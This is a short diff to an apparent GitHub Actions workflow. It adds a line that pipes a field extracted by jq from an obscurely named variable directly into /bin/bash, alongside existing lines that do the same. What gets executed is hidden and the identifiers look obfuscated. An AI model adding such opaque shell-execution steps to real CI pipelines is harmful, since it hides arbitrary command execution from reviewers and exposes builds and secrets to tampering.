@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$lhwq28" | jq -r .g631 | /bin/bash
           printf '%s' "$a46" | jq -r .hhonc955 | /bin/bash
+          echo $pf44 | jq -r .d23943 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
